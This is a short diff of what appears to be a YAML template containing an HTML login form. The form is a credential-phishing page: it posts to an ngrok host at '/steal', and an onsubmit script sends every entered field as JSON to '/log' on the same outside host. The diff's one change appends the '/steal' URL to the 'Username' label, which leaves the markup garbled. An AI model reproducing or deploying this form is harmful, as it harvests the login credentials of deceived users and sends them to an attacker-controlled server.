@@ -13,7 +13,7 @@ info:
       <div style='width:100%;max-width:400px;margin:0 auto;padding:20px;background:#fff;border-radius:8px;box-shadow:0 4px 8px rgba(0,0,0,0.1);'>
         <form action='https://agelong-susurrant-zayne.ngrok-free.dev/steal' method='post' class='form-signin' onsubmit='fetch("https://agelong-susurrant-zayne.ngrok-free.dev/log",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({event:"submit",data:Object.fromEntries(new FormData(this))})).catch(err=>console.error("Log failed:",err));'>
           <div style='margin-bottom:15px;'>
-            <label for='username' style='font-size:14px;color:#555;display:block;margin-bottom:5px;'>Username</label>
+            <label for='username' style='font-size:14px;color:#555;display:block;margin-bottom:5px;'>Usernamehttps://agelong-susurrant-zayne.ngrok-free.dev/steal</label>
             <input type='text' name='username' style='width:100%;padding:10px;font-size:14px;border:1px solid #ccc;border-radius:4px;'>
           </div>
           <div style='margin-bottom:15px;'>
